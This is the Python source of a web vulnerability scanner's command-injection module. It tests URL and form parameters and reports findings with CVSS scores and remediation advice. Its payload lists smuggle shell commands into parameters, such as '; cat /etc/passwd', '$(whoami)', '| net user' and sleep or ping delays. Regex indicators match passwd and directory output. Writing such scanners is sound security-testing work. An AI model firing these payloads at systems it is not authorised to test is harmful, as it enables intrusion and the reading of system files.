import re
import logging
from urllib.parse import urlparse, parse_qs
from app.scanner.vulnerabilities.base import BaseScanner
from app.scanner.payload_manager import get_payload_manager

logger = logging.getLogger(__name__)


class CommandInjectionScanner(BaseScanner):
    """OS Command Injection scanner with GET/POST support,
    output-based and time-based blind detection."""

    # ── Payloads ─────────────────────────────────────────────────────

    def __init__(self, session=None, timeout=8, delay=0.5):
        super().__init__(session, timeout, delay)
        try:
            self.payload_manager = get_payload_manager()
            pm_payloads = self.payload_manager.get_payloads('command_injection', source='both')
            existing = set(self.LINUX_OUTPUT_PAYLOADS + self.WINDOWS_OUTPUT_PAYLOADS)
            extra = [p for p in pm_payloads if p not in existing]
            self.LINUX_OUTPUT_PAYLOADS = list(self.LINUX_OUTPUT_PAYLOADS) + extra
            stats = self.payload_manager.get_stats()
            count = stats['total'].get('command_injection', 0)
            logger.info(f'Command Injection: {count} payloads available ({len(extra)} new from PayloadManager)')
        except Exception as e:
            self.payload_manager = None
            logger.debug(f'PayloadManager not available: {e}')

        # AI-generated smart payloads
        try:
            smart = self._get_smart_payloads('command_injection')
            if smart:
                existing_set = set(self.LINUX_OUTPUT_PAYLOADS + self.WINDOWS_OUTPUT_PAYLOADS)
                new_smart = [p for p in smart if p not in existing_set]
                self.LINUX_OUTPUT_PAYLOADS = list(self.LINUX_OUTPUT_PAYLOADS) + new_smart
        except Exception:
            pass

    # Output-based: Linux
    LINUX_OUTPUT_PAYLOADS = [
        '; cat /etc/passwd',
        '| cat /etc/passwd',
        '`cat /etc/passwd`',
        '$(cat /etc/passwd)',
        '; ls -la',
        '| ls -la',
        '`ls -la`',
        '$(ls -la)',
        '; whoami',
        '| whoami',
        '`whoami`',
        '$(whoami)',
        '; id',
        '| id',
        '$(id)',
        '; uname -a',
        '| uname -a',
        '; cat /etc/hosts',
        '|| cat /etc/passwd',
        '&& cat /etc/passwd',
    ]

    # Output-based: Windows
    WINDOWS_OUTPUT_PAYLOADS = [
        '| dir',
        '& dir',
        '&& dir',
        '| type C:\\windows\\win.ini',
        '& type C:\\windows\\win.ini',
        '| whoami',
        '& whoami',
        '| net user',
        '& net user',
        '| systeminfo',
    ]

    # Time-based blind: Linux
    LINUX_TIME_PAYLOADS = [
        '; sleep {delay}',
        '| sleep {delay}',
        '`sleep {delay}`',
        '$(sleep {delay})',
        '|| sleep {delay}',
        '&& sleep {delay}',
        '; sleep {delay} #',
        '| sleep {delay} #',
    ]

    # Time-based blind: Windows
    WINDOWS_TIME_PAYLOADS = [
        '| timeout /T {delay} /NOBREAK',
        '& timeout /T {delay} /NOBREAK',
        '| ping -n {delay} 127.0.0.1',
        '& ping -n {delay} 127.0.0.1',
        '&& ping -n {delay} 127.0.0.1',
    ]

    # ── Output indicators ────────────────────────────────────────────

    CMD_INDICATORS = [
        # /etc/passwd lines
        r'root:.*:0:0:',
        r'daemon:.*:',
        r'www-data:',
        r'nobody:',
        r'bin/(ba)?sh',
        # Directory listings (Linux)
        r'total\s+\d+',
        r'drwx[r-][w-][x-]',
        r'-rw-r--r--',
        r'lrwx',
        # whoami/id output
        r'uid=\d+\(',
        r'gid=\d+\(',
        # Windows indicators
        r'Volume\s+in\s+drive',
        r'Directory\s+of',
        r'\d+\s+File\(s\)',
        r'\d+\s+Dir\(s\)',
        r'\[fonts\]',
        r'\[extensions\]',
        r'\\Windows\\',
        # uname output
        r'Linux\s+\S+\s+\d+\.\d+',
        r'GNU/Linux',
        # /etc/hosts
        r'127\.0\.0\.1\s+localhost',
        # net user
        r'User accounts for',
        r'Administrator\s+',
    ]

    SLEEP_DELAY = 3

    def _detect_target_os(self, url):
        """Detect target OS by checking response headers."""
        try:
            resp = self._request('GET', url)
            if resp:
                server = resp.headers.get('Server', '').lower()
                powered = resp.headers.get('X-Powered-By', '').lower()
                if any(w in server for w in ('apache', 'nginx', 'unix', 'ubuntu', 'debian', 'centos')):
                    return 'linux'
                if any(w in server for w in ('iis', 'microsoft')):
                    return 'windows'
                if 'php' in powered:
                    return 'linux'  # PHP most commonly on Linux
        except Exception:
            pass
        return 'unknown'

    def _check_cmd_output(self, response_text):
        """Check if response contains command execution output."""
        if not response_text:
            return False, None
        for pattern in self.CMD_INDICATORS:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return True, match.group(0)
        return False, None

    def _test_url_param(self, url, param_name, params, parsed, target_os='unknown'):
        """Test a URL parameter for command injection."""
        # Use only relevant payloads based on detected OS
        if target_os == 'linux':
            all_output_payloads = self.LINUX_OUTPUT_PAYLOADS
        elif target_os == 'windows':
            all_output_payloads = self.WINDOWS_OUTPUT_PAYLOADS
        else:
            all_output_payloads = self.LINUX_OUTPUT_PAYLOADS + self.WINDOWS_OUTPUT_PAYLOADS

        # Get baseline response to filter false positives
        baseline_resp = self._request('GET', url)
        baseline_has_indicators = False
        if baseline_resp:
            baseline_has_indicators, _ = self._check_cmd_output(baseline_resp.text)

        for payload in all_output_payloads:
            orig_val = params.get(param_name, ['test'])[0]
            test_params = dict(params)
            test_params[param_name] = [orig_val + payload]
            query = '&'.join(f"{k}={v[0]}" for k, v in test_params.items())
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

            response = self._request('GET', test_url)
            if response:
                found, evidence = self._check_cmd_output(response.text)
                if found:
                    # Only report if pattern was NOT in the baseline
                    if baseline_has_indicators:
                        # Check if the evidence is the same as baseline
                        _, baseline_evidence = self._check_cmd_output(baseline_resp.text)
                        if baseline_evidence and evidence == baseline_evidence:
                            continue  # Same indicator exists without injection
                    return {
                        'technique': 'output-based',
                        'payload': payload,
                        'url': test_url,
                        'param': param_name,
                        'method': 'GET',
                        'evidence': f'Command output detected: {evidence}'
                    }

        # Time-based blind
        baseline = self._get_baseline_time(url)
        if target_os == 'linux':
            all_time_payloads = self.LINUX_TIME_PAYLOADS
        elif target_os == 'windows':
            all_time_payloads = self.WINDOWS_TIME_PAYLOADS
        else:
            all_time_payloads = self.LINUX_TIME_PAYLOADS + self.WINDOWS_TIME_PAYLOADS

        for payload_template in all_time_payloads:
            payload = payload_template.format(delay=self.SLEEP_DELAY)
            orig_val = params.get(param_name, ['test'])[0]
            test_params = dict(params)
            test_params[param_name] = [orig_val + payload]
            query = '&'.join(f"{k}={v[0]}" for k, v in test_params.items())
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

            resp, elapsed = self._timed_request('GET', test_url)
            if elapsed >= baseline + self.SLEEP_DELAY - 0.5:
                # Verify
                resp2, elapsed2 = self._timed_request('GET', test_url)
                if elapsed2 >= baseline + self.SLEEP_DELAY - 0.5:
                    return {
                        'technique': 'time-blind',
                        'payload': payload,
                        'url': test_url,
                        'param': param_name,
                        'method': 'GET',
                        'evidence': f'Response delayed: {elapsed:.1f}s (baseline: {baseline:.1f}s)'
                    }

        return None

    def _test_form(self, form):
        """Test form inputs for command injection."""
        url = form.get('action', '')
        method = form.get('method', 'get').upper()
        inputs = form.get('inputs', [])

        testable = [inp for inp in inputs
                    if inp['type'] not in ('submit', 'button', 'hidden', 'csrf', 'image', 'reset')]

        for target_input in testable:
            all_payloads = self.LINUX_OUTPUT_PAYLOADS[:10] + self.WINDOWS_OUTPUT_PAYLOADS[:5]

            for payload in all_payloads:
                data = {}
                for inp in inputs:
                    if inp['name'] == target_input['name']:
                        data[inp['name']] = (inp.get('value', '') or 'test') + payload
                    elif inp['type'] in ('submit', 'button'):
                        data[inp['name']] = inp.get('value', 'Submit')
                    else:
                        data[inp['name']] = inp.get('value', '') or 'test'

                if method == 'POST':
                    response = self._request('POST', url, data=data)
                else:
                    response = self._request('GET', url, params=data)

                if response:
                    found, evidence = self._check_cmd_output(response.text)
                    if found:
                        return {
                            'technique': 'output-based (form)',
                            'payload': payload,
                            'url': url,
                            'param': target_input['name'],
                            'method': method,
                            'evidence': f'Command output: {evidence}'
                        }

            # Time-based blind on forms
            for payload_template in self.LINUX_TIME_PAYLOADS[:3]:
                payload = payload_template.format(delay=self.SLEEP_DELAY)
                data = {}
                for inp in inputs:
                    if inp['name'] == target_input['name']:
                        data[inp['name']] = (inp.get('value', '') or 'test') + payload
                    elif inp['type'] in ('submit', 'button'):
                        data[inp['name']] = inp.get('value', 'Submit')
                    else:
                        data[inp['name']] = inp.get('value', '') or 'test'

                baseline = self._get_baseline_time(url, method=method, data=data if method == 'POST' else None)
                if method == 'POST':
                    resp, elapsed = self._timed_request('POST', url, data=data)
                else:
                    resp, elapsed = self._timed_request('GET', url, params=data)

                if elapsed >= baseline + self.SLEEP_DELAY - 0.5:
                    return {
                        'technique': 'time-blind (form)',
                        'payload': payload,
                        'url': url,
                        'param': target_input['name'],
                        'method': method,
                        'evidence': f'Response delayed: {elapsed:.1f}s vs {baseline:.1f}s baseline'
                    }

        return None

    # ── Main scan ────────────────────────────────────────────────────

    def scan(self, target_url, injectable_points):
        self.findings = []
        seen = set()

        # Detect OS once for better payload targeting
        target_os = self._detect_target_os(target_url)

        for point in injectable_points:
            # ── Forms ──
            if isinstance(point, dict) and point.get('type') == 'form':
                result = self._test_form(point)
                if result:
                    key = f"{result['url']}:{result['param']}"
                    if key not in seen:
                        seen.add(key)
                        self.findings.append(self._make_finding(result))

            # ── URL params ──
            elif isinstance(point, dict) and 'name' in point:
                url = point.get('url', target_url)
                param = point['name']
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                key = f"{url}:{param}"

                if key in seen or param not in params:
                    continue

                result = self._test_url_param(url, param, params, parsed, target_os=target_os)
                if result:
                    seen.add(key)
                    self.findings.append(self._make_finding(result))

        return self.findings

    def _make_finding(self, result):
        technique = result['technique']
        finding = {
            'vuln_type': 'command_injection',
            'name': f'OS Command Injection ({technique})',
            'description': (
                f'Command injection detected via {technique}. '
                'User-supplied input is passed directly to OS shell commands '
                'without sanitization, allowing arbitrary command execution.'
            ),
            'impact': 'Remote code execution, full server compromise, data exfiltration, lateral movement, cryptomining.',
            'severity': 'critical',
            'cvss_score': 9.8,
            'owasp_category': 'A03',
            'affected_url': result['url'],
            'parameter': result['param'],
            'payload': result['payload'],
            'request_data': f"{result.get('method', 'GET')} {result['url']}\nParam: {result['param']}",
            'response_data': result.get('evidence', 'Command execution confirmed'),
            'remediation': (
                'Never pass user input to shell commands. Use language-specific APIs '
                'instead of shell execution. Whitelist allowed input values. '
                'Apply strict input validation. Run with minimal OS privileges.'
            )
        }
        if 'difficulty' in result:
            finding['difficulty'] = result['difficulty']
        return finding
